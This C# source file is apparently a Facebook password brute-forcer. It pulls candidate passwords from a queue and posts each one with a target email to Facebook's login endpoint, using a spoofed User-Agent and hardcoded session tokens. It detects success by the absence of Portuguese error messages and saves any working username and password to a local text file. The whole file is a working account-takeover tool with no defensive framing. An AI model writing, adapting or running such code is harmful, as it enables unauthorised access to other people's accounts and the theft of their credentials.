using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

namespace FBBF
{
    public class API
    {
        #region properties
        public static String User { get; set; }
        public static ConcurrentQueue<string> FilaPrincipal { get; set; }

        #endregion

        #region public methods
        public static async void StartFBBF()
        {
            try
            {
                bool found = false;
                string result = String.Empty;
                bool removed;
                while (true)
                    if (FilaPrincipal.Count > 0)
                    {
                        do
                        {
                            removed = FilaPrincipal.TryDequeue(out result);
                        }
                        while (!removed);
                        found = await StartBruteForceForThread(User, result);
                        if (found)
                            Environment.Exit(0);

                    }
            }
            catch (Exception)
            {
            }
        }

        #endregion

        #region private methods

        private static async Task<bool> StartBruteForceForThread(string user, string senha)
        {
            try
            {
                Console.WriteLine("Trying "+senha);
                var baseAddress = new Uri("https://www.facebook.com/");
                var cookieContainer = new CookieContainer();
                using (var handler = new HttpClientHandler()
                {
                    CookieContainer = cookieContainer,
                    UseCookies = true
                })

                using (var client = new HttpClient(handler))
                {
                    client.BaseAddress = baseAddress;
                    //cookieContainer.Add(baseAddress, new Cookie("wd", "1366x638"));
                    cookieContainer.Add(baseAddress, new Cookie("datr", "80ZzUfKqDOjwL8pauwqMjHTa"));

                    addHeadersFacebookByClient(client);

                    var values = new Dictionary<string, string>
                    {
                        { "lsd", "AVpD2t1f" },
                        { "display", "" },
                        { "enable_profile_selector", "" },
                        { "legacy_return", "1" },
                        { "next", "" },
                        { "profile_selector_ids", "" },
                        { "trynum", "1" },
                        { "timezone", "300" },
                        { "lgnrnd", "031110_Euoh" },
                        { "lgnjs", "1366193470" },
                        { "default_persistent", "0" },
                        { "login", "Log+In" },
                        { "email", user },
                        { "pass", senha },
                    };
                    var content = new FormUrlEncodedContent(values);

                    //var response = await client.PostAsync("/login.php", content);

                    var response = await client.PostAsync("/login.php", content);

                    string responseString = response.Content.ReadAsStringAsync().Result;

                    if (!responseString.Contains("A senha inserida") && 
                        !responseString.Contains("Tente novamente mais tarde")
                        && !responseString.Contains("Não foi possível processar sua solicitação"))
                    {
                        StreamWriter sw = new StreamWriter(@"C:\fb bf\SenhaUsuario.txt");
                        sw.WriteLine(user);
                        sw.WriteLine(senha);
                        sw.Close();
                        return true;
                    }
                }
            }
            catch (Exception)
            {
            }

            return false;
        }

        private static void addHeadersFacebookByClient(HttpClient client)
        {
            client.DefaultRequestHeaders.Host = "www.facebook.com";
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36");
        }

        #endregion

    }
}
